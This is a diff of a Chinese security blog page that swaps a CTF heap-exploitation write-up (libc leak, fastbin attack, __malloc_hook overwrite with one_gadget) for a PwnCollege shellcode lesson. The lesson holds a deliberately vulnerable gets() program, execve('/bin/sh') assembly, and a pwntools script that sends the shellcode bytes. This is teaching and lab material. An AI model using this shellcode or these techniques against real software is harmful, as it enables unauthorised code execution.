@@ -16,24 +16,24 @@
   <meta name="author" content="Hush">
   <meta name="keywords" content="">
   
-    <meta name="description" content="白天睡觉，晚上来写道题。 分析这道题涉及了unsortedbins，malloc_hook，堆溢出。 heap的菜单选项常规题，做到目前为止，主要是两个思路： 先check，根据RELRO。如果为full，那么就需要malloc_hook。如果为partial，就直接更改got表就可以了。 在create函数中可以明显看出来这是个结构体  一个结构体有24个字节，前8个为标志位，中间8个size位">
+    <meta name="description" content="课程链接 漏洞程序 hello.c12345678910111213void bye1()&amp;#123; puts(&quot;Goodbye!&quot;); &amp;#125;void bye2()&amp;#123; puts(&quot;Farewell!&quot;); &amp;#125;void hello(char * name ,void (* bye_func)())&amp;#123; 	printf(&amp;q">
 <meta property="og:type" content="article">
-<meta property="og:title" content="roarctf_2019_easy_pwn">
-<meta property="og:url" content="https://hushs1gnal.github.io/2021/07/29/roarctf_2019_easy_pwn/index.html">
+<meta property="og:title" content="PwnCollege_shellcode第一章">
+<meta property="og:url" content="https://hushs1gnal.github.io/2022/05/24/Pwncollege_shellocode_1/index.html">
 <meta property="og:site_name" content="Hush&#39;blog">
-<meta property="og:description" content="白天睡觉，晚上来写道题。 分析这道题涉及了unsortedbins，malloc_hook，堆溢出。 heap的菜单选项常规题，做到目前为止，主要是两个思路： 先check，根据RELRO。如果为full，那么就需要malloc_hook。如果为partial，就直接更改got表就可以了。 在create函数中可以明显看出来这是个结构体  一个结构体有24个字节，前8个为标志位，中间8个size位">
+<meta property="og:description" content="课程链接 漏洞程序 hello.c12345678910111213void bye1()&amp;#123; puts(&quot;Goodbye!&quot;); &amp;#125;void bye2()&amp;#123; puts(&quot;Farewell!&quot;); &amp;#125;void hello(char * name ,void (* bye_func)())&amp;#123; 	printf(&amp;q">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://hushs1gnal.github.io/img/hello1.jpg">
-<meta property="article:published_time" content="2021-07-28T20:57:39.000Z">
-<meta property="article:modified_time" content="2022-05-24T04:07:18.956Z">
+<meta property="og:image" content="https://hushs1gnal.github.io/img/hello6.jpg">
+<meta property="article:published_time" content="2022-05-24T04:39:07.890Z">
+<meta property="article:modified_time" content="2022-05-24T04:47:46.401Z">
 <meta property="article:author" content="Hush">
-<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="Pwn">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://hushs1gnal.github.io/img/hello1.jpg">
+<meta name="twitter:image" content="https://hushs1gnal.github.io/img/hello6.jpg">
   
   
   
-  <title>roarctf_2019_easy_pwn - Hush&#39;blog</title>
+  <title>PwnCollege_shellcode第一章 - Hush&#39;blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -184,7 +184,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="roarctf_2019_easy_pwn"></span>
+            <span id="subtitle" data-typed-text="PwnCollege_shellcode第一章"></span>
           
         </div>
 
@@ -195,8 +195,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2021-07-29 04:57" pubdate>
-          2021年7月29日 凌晨
+        <time datetime="2022-05-24 12:39" pubdate>
+          2022年5月24日 下午
         </time>
       </span>
     
@@ -207,7 +207,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          903 字
+          1.1k 字
         
       </span>
     
@@ -247,32 +247,30 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">roarctf_2019_easy_pwn</h1>
+            <h1 style="display: none">PwnCollege_shellcode第一章</h1>
             
             <div class="markdown-body">
               
-              <p>白天睡觉，晚上来写道题。</p>
-<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>这道题涉及了unsortedbins，malloc_hook，堆溢出。</p>
-<p>heap的菜单选项常规题，做到目前为止，主要是两个思路：</p>
-<p>先check，根据RELRO。如果为full，那么就需要malloc_hook。如果为partial，就直接更改got表就可以了。</p>
-<p>在create函数中可以明显看出来这是个结构体</p>
-<p><img src="/img/roarctf_2019_easy_pwn-1.png" srcset="/img/loading.gif" lazyload alt="roarctf_2019_easy_pwn-1"></p>
-<p>一个结构体有24个字节，前8个为标志位，中间8个size位，后8个是alloc出来的chunk的指针。</p>
-<p>（alloc和malloc不同的是 alloc的free后会清空用户数据区）</p>
-<p>其中a1 为基地址，我一开始还打算去找这个a1，</p>
-<p>但是看到这个a1的初始化。</p>
-<p><img src="/img/roarctf_2019_easy_pwn-2.png" srcset="/img/loading.gif" lazyload alt="roarctf_2019_easy_pwn-2"></p>
-<p>这里面buf是随机数字，所以a1搜寻未果。</p>
-<p><img src="/img/roarctf_2019_easy_pwn-3.png" srcset="/img/loading.gif" lazyload alt="roarctf_2019_easy_pwn-3"></p>
-<p>fill函数中，没有根据chunk的大小来限制写入大小。所以存在着溢出漏洞。</p>
-<p>主要思路就是，根据unsorted bin 中的fd。利用main_arean泄露libc（这个还没有查阅资料）</p>
-<p>然后利用之前布置好的盖在小块的大块来dump出来。</p>
-<p>接下来是漏洞利用。钩子函数详细，可以查阅这个资料<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41453285/article/details/99315504">https://blog.csdn.net/qq_41453285/article/details/99315504</a></p>
-<p>里面介绍的很清晰，具体思路就是，在钩子函数之前有一个为末位的一块内存区域，因为fastbin中没有对齐限制。所以我们可以修改fastbin中最后一个的fd指针，指向这里，让fastbin将它加入，然后在malloc一下，之后就可以通过溢出（具体溢出长度，上面那个资料中有详细的介绍）来修改malloc_hook 处的内容：malloc函数执行的时候会先检测__malloc_hook是否为空，如果不为空就执行__mallochook。所以这时候把malloc_hook 修改为一个one_gadget的地址（好像是存在这几个固定的地址。只需要libc的基地址加上这个偏移）</p>
-<p>那么最后再malloc一个chunk就可以触发 one_gadget。</p>
-<p>果然还是多做题才能多涨姿势。</p>
-<p>但是套路应该就是这几个套路了。</p>
-<p>难题可能在泄露libc上下难度，目前我觉得应该就是这几个套路了，后续继续学习新的漏洞利用手段。</p>
+              <p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=715v_-YnpT8">课程链接</a></p>
+<h1 id="漏洞程序-hello-c"><a href="#漏洞程序-hello-c" class="headerlink" title="漏洞程序 hello.c"></a>漏洞程序 hello.c</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">bye1</span><span class="hljs-params">()</span>&#123; <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Goodbye!&quot;</span>); &#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">bye2</span><span class="hljs-params">()</span>&#123; <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Farewell!&quot;</span>); &#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">(<span class="hljs-type">char</span> * name ,<span class="hljs-type">void</span> (* bye_func)())</span>&#123;<br> 	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello , %s\n&quot;</span>,name);<br>	bye_func();<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span>&#123;<br>	<span class="hljs-type">char</span> name[<span class="hljs-number">1024</span>];<br>	gets(name);<br>	srand(time(<span class="hljs-number">0</span>));<br>	<span class="hljs-keyword">if</span>(rand()%<span class="hljs-number">2</span>) hello(bye1,name);<br> 	<span class="hljs-keyword">else</span> hello(name,bye2);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>GCC编译，1&#x2F;2的概率程序崩溃</p>
+<p><img src="/img/pwncollege-1.png" srcset="/img/loading.gif" lazyload alt="pwncollege-1"></p>
+<h1 id="shellcode-s"><a href="#shellcode-s" class="headerlink" title="shellcode.s"></a>shellcode.s</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.global _start           #.global定义一个全局符号 _start 为程序的入口<br>_start:                  # _start: 标志程序入口<br>.intel_syntax noprefix   #intel代码格式<br>  	mov rax, 59          #系统调用号  <br>	lea rdi, [rip+binsh] #binsh偏移<br>	mov rsi, 0<br>	mov rdx, 0<br>	syscall<br>binsh:                  #binsh标号<br>	.string &quot;/bin/sh&quot;   #.string 标志string类型<br></code></pre></td></tr></table></figure>
+
+<p>编译运行</p>
+<p><img src="/img/pwncollege-2.png" srcset="/img/loading.gif" lazyload alt="pwncollege-2"></p>
+<p>objdump 看一下section</p>
+<p><img src="/img/pwncollege-3.png" srcset="/img/loading.gif" lazyload alt="pwncollege-3"></p>
+<p> 其实到这里对于shellcode已经是可以使用了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p=process(<span class="hljs-string">&#x27;./hello&#x27;</span>)<br>payload=<span class="hljs-string">&quot;\x48\xc7\xc0\x3b\x00\x00\x00\x48\x8d\x3d\x10\x00\x00\x00\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/pwncollege-4.png" srcset="/img/loading.gif" lazyload alt="pwncollege-4"></p>
+<p>视频中演示了另一种方法，利用objcpoy 将代码段部分转移到shellcode-raw文件中</p>
+<p><img src="/img/pwncollege-6.png" srcset="/img/loading.gif" lazyload alt="pwncollege-6"></p>
+<p>（hd &#x3D;hexdump）用十六进制把二进制文件打印出来</p>
+<p><img src="/img/pwncollege-5.png" srcset="/img/loading.gif" lazyload alt="pwncollege-5"></p>
+<p> 利用管道符（这行指令还没太看明白，但是用的应该不多，不去深究了）</p>
 
               
             </div>
@@ -295,7 +293,7 @@
   
     <span>></span>
     
-  <a href="/categories/Pwn/heap/" class="category-chain-item">heap</a>
+  <a href="/categories/Pwn/base/" class="category-chain-item">base</a>
   
   
 
@@ -312,7 +310,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/pwn/">#pwn</a>
+        <a href="/tags/Pwn/">#Pwn</a>
       
     </div>
   
@@ -324,8 +322,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>roarctf_2019_easy_pwn</div>
-      <div>https://hushs1gnal.github.io/2021/07/29/roarctf_2019_easy_pwn/</div>
+      <div>PwnCollege_shellcode第一章</div>
+      <div>https://hushs1gnal.github.io/2022/05/24/Pwncollege_shellocode_1/</div>
     </div>
     <div class="license-meta">
       
@@ -337,7 +335,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2021年7月29日</div>
+          <div>2022年5月24日</div>
         </div>
       
       
@@ -367,18 +365,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/11/18/sctf2019_easy_heap/" title="sctf2019_easy_heap">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">sctf2019_easy_heap</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/07/27/ZJCTF2019-EasyHeap/" title="ZJCTF2019-EasyHeap">
-                        <span class="hidden-mobile">ZJCTF2019-EasyHeap</span>
+                      <a href="/2022/05/24/kernelROP-2018%E5%BC%BA%E7%BD%91%E6%9D%AF-core/" title="kernel_ROP-2018_强网杯-core">
+                        <span class="hidden-mobile">kernel_ROP-2018_强网杯-core</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
